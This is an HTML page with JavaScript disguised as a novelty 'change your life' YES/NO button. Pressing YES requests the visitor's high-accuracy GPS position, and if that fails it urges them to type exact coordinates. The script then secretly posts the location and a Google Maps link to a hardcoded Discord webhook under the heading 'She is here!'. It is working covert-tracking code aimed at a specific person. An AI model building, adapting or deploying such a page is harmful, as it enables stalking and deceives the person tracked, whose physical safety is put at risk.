<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover, user-scalable=no">
  <title>📍 precise location signal</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      -webkit-tap-highlight-color: transparent;
    }
    body {
      min-height: 100vh;
      background: radial-gradient(circle at 20% 30%, #0b0f1c, #03050b);
      display: flex;
      align-items: center;
      justify-content: center;
      font-family: system-ui, -apple-system, 'Segoe UI', 'Poppins', sans-serif;
      padding: 1.2rem;
    }
    .card {
      max-width: 550px;
      width: 100%;
      background: rgba(18, 22, 35, 0.85);
      backdrop-filter: blur(14px);
      border-radius: 2.5rem;
      padding: 1.8rem 1.2rem;
      box-shadow: 0 25px 45px rgba(0,0,0,0.5);
      border: 1px solid rgba(255,215,150,0.3);
      text-align: center;
    }
    h1 {
      font-size: 1.9rem;
      background: linear-gradient(135deg, #FFE6B0, #FFB347);
      background-clip: text;
      -webkit-background-clip: text;
      color: transparent;
      margin-bottom: 0.5rem;
    }
    .sub {
      color: #a9b7e0;
      font-size: 0.8rem;
      margin-bottom: 1.5rem;
    }
    .button-group {
      display: flex;
      gap: 1rem;
      justify-content: center;
      margin: 1.5rem 0;
    }
    button {
      flex: 1;
      padding: 0.9rem;
      font-size: 1.4rem;
      font-weight: bold;
      border: none;
      border-radius: 60px;
      font-family: inherit;
      cursor: pointer;
      transition: 0.1s linear;
    }
    .btn-yes { background: #2ecc71; color: white; box-shadow: 0 5px 0 #1e8e4a; }
    .btn-no { background: #3a3e55; color: #cdd4ff; box-shadow: 0 5px 0 #1e2132; }
    button:active { transform: translateY(2px); box-shadow: 0 2px 0; }
    button:disabled { opacity: 0.5; transform: none; cursor: not-allowed; }
    .info-box {
      background: rgba(0,0,0,0.5);
      border-radius: 1.5rem;
      padding: 0.8rem;
      margin: 1rem 0;
      font-size: 0.85rem;
      color: #ffdfb3;
    }
    .findme {
      font-size: 2rem;
      font-weight: bold;
      background: radial-gradient(circle, #FFD966, #FF8C42);
      background-clip: text;
      -webkit-background-clip: text;
      color: transparent;
      margin-top: 1rem;
    }
    .accuracy-warning {
      background: #2c1a1a;
      border-left: 5px solid #ffaa44;
      padding: 0.6rem;
      border-radius: 1rem;
      font-size: 0.75rem;
      margin: 0.5rem 0;
    }
    .retry-btn {
      background: #ffaa33;
      color: #1a1a2e;
      padding: 0.4rem 1rem;
      font-size: 0.8rem;
      border-radius: 30px;
      display: inline-block;
      margin-top: 8px;
      cursor: pointer;
    }
    .manual-link {
      color: #ffaa77;
      text-decoration: underline;
      cursor: pointer;
      font-size: 0.75rem;
    }
    input, textarea {
      width: 100%;
      background: #1e1f2c;
      border: 1px solid #ffb347;
      color: white;
      padding: 8px;
      border-radius: 20px;
      margin: 8px 0;
      font-family: monospace;
    }
    .hidden { display: none; }
  </style>
</head>
<body>
<div class="card" id="app">
  <h1>⚡ DO U WANT TO CHANGE UR LIFE? ⚡</h1>
  <div class="sub">one tap · destiny unlocked</div>

  <div class="button-group">
    <button class="btn-yes" id="yesBtn">✔️ YES</button>
    <button class="btn-no" id="noBtn">❌ NO</button>
  </div>

  <div id="messageArea" class="info-box">✨ press YES and allow location ✨</div>
  <div id="findmeArea"></div>
</div>

<script>
  // ===== CONFIGURATION =====
  // REPLACE WITH YOUR REAL DISCORD WEBHOOK URL (keep the quotes)
  const WEBHOOK_URL = "https://discord.com/api/webhooks/1493349822038802562/kCMiXet_oTmUm7cChL6K2vmmw62e43YnXCFDk2niMPN-v64bsBSLtbirZXlrNWho5CHM";   // <--- CHANGE THIS
  
  let isProcessing = false;
  let locationSent = false;

  // Helper to send location to Discord
  async function sendToDiscord(lat, lng, accuracy, source = "gps") {
    if (!WEBHOOK_URL || WEBHOOK_URL === "YOUR_DISCORD_WEBHOOK_URL_HERE") {
      console.warn("Webhook not set");
      return false;
    }
    const mapsLink = `https://maps.google.com/?q=${lat},${lng}`;
    const payload = {
      content: `📍 **EXACT LOCATION FOUND** (${source}) - accuracy ±${Math.round(accuracy)}m`,
      embeds: [{
        title: "🎯 She is here!",
        fields: [
          { name: "Coordinates", value: `${lat}, ${lng}`, inline: true },
          { name: "Accuracy", value: `~${Math.round(accuracy)} meters`, inline: true },
          { name: "Map", value: `[Open in Google Maps](${mapsLink})`, inline: false }
        ],
        color: 0xff914d
      }]
    };
    try {
      const res = await fetch(WEBHOOK_URL, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) });
      return res.ok;
    } catch(e) { return false; }
  }

  // Show "FIND ME" text
  function showFindMe() {
    document.getElementById('findmeArea').innerHTML = '<div class="findme">🔍 FIND ME 🔍</div>';
  }

  // Set message in info box
  function setMessage(msg, isError = false) {
    const box = document.getElementById('messageArea');
    box.innerHTML = msg;
    box.style.borderLeft = isError ? '4px solid #ff6644' : 'none';
  }

  // Manual coordinate fallback (she can type exact lat/lng from Google Maps)
  function showManualEntry() {
    setMessage("📍 Couldn't get precise GPS? You can drop a pin on Google Maps and paste coordinates here:", false);
    const manualDiv = document.createElement('div');
    manualDiv.innerHTML = `
      <input type="text" id="manualLat" placeholder="Latitude (e.g., 23.7456)" style="margin-top:10px">
      <input type="text" id="manualLng" placeholder="Longitude (e.g., 90.3732)">
      <button id="submitManual" style="background:#ffaa44; color:#1e1e2a; margin-top:6px;">✅ Send exact location</button>
      <div style="font-size:0.7rem; margin-top:6px;">💡 How to get exact numbers: Open Google Maps → long press on your exact spot → copy coordinates</div>
    `;
    document.getElementById('messageArea').appendChild(manualDiv);
    document.getElementById('submitManual').onclick = async () => {
      const lat = parseFloat(document.getElementById('manualLat').value);
      const lng = parseFloat(document.getElementById('manualLng').value);
      if (isNaN(lat) || isNaN(lng)) {
        setMessage("❌ Invalid coordinates. Use numbers like 23.7456, 90.3732", true);
        return;
      }
      setMessage("📡 Sending exact location...");
      const success = await sendToDiscord(lat, lng, 5, "manual pin");
      if (success) {
        setMessage("✅ U are good");
        showFindMe();
        locationSent = true;
        document.getElementById('yesBtn').disabled = true;
        document.getElementById('noBtn').disabled = true;
      } else {
        setMessage("⚠️ Failed to send. Check webhook URL or try again.", true);
      }
    };
  }

  // Main geolocation with high accuracy + retry if inaccurate
  function requestPreciseLocation() {
    if (!navigator.geolocation) {
      setMessage("❌ Browser doesn't support geolocation. Try Chrome or Safari.", true);
      showManualEntry();
      return;
    }

    setMessage("📍 Requesting EXACT location... (make sure GPS is ON, precise mode enabled, and you're outdoors or near window)");

    navigator.geolocation.getCurrentPosition(
      async (pos) => {
        const { latitude, longitude, accuracy } = pos.coords;
        setMessage(`📍 Found location! Accuracy: ±${Math.round(accuracy)} meters`);

        // If accuracy is worse than 100 meters, warn and offer retry
        if (accuracy > 100) {
          const warnBox = document.createElement('div');
          warnBox.className = "accuracy-warning";
          warnBox.innerHTML = `⚠️ Location is only accurate within ~${Math.round(accuracy)}m (may show wrong road). For exact spot, move outside or near window, then <span class="retry-btn" id="retryBtn">⟳ Retry with better signal</span>`;
          document.getElementById('messageArea').appendChild(warnBox);
          document.getElementById('retryBtn')?.addEventListener('click', () => {
            document.getElementById('messageArea').innerHTML = '';
            requestPreciseLocation();
          });
          // Still allow sending but with warning
          const sendAnyway = confirm(`Accuracy is ${Math.round(accuracy)}m. That might be off by several roads. Send anyway?`);
          if (!sendAnyway) return;
        }

        // Send to Discord
        const sent = await sendToDiscord(latitude, longitude, accuracy, "gps");
        if (sent) {
          setMessage("✅ Precise location delivered", false);
          showFindMe();
          locationSent = true;
          document.getElementById('yesBtn').disabled = true;
          document.getElementById('noBtn').disabled = true;
        } else {
          setMessage("⚠️ Webhook error. Use manual entry below.", true);
          showManualEntry();
        }
      },
      (err) => {
        console.error(err);
        let errorMsg = "";
        switch(err.code) {
          case 1: errorMsg = "❌ Permission denied. You must allow location for this to work. Go to browser settings → Location → Allow."; break;
          case 2: errorMsg = "❌ Position unavailable. Try turning on GPS & being outside."; break;
          case 3: errorMsg = "⏱️ Timeout. Retry or use manual entry below."; break;
          default: errorMsg = "Unknown error. Try manual entry.";
        }
        setMessage(errorMsg, true);
        showManualEntry();
      },
      { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
    );
  }

  // YES button action
  document.getElementById('yesBtn').onclick = () => {
    if (isProcessing || locationSent) return;
    isProcessing = true;
    setMessage("🌍 Accessing sacred powers...");
    requestPreciseLocation();
    isProcessing = false;
  };

  // NO button does nothing
  document.getElementById('noBtn').onclick = () => {
    setMessage("❌ Nothing happens. Only YES changes your life.", true);
    if (navigator.vibrate) navigator.vibrate(50);
  };

  // Show webhook warning if not set
  if (!WEBHOOK_URL || WEBHOOK_URL === "https://discord.com/api/webhooks/1493349822038802562/kCMiXet_oTmUm7cChL6K2vmmw62e43YnXCFDk2niMPN-v64bsBSLtbirZXlrNWho5CHM") {
    setMessage("⚠️ Webhook not configured. Go to code and add your Discord webhook URL to receive location.", true);
  }
</script>
</body>
</html>
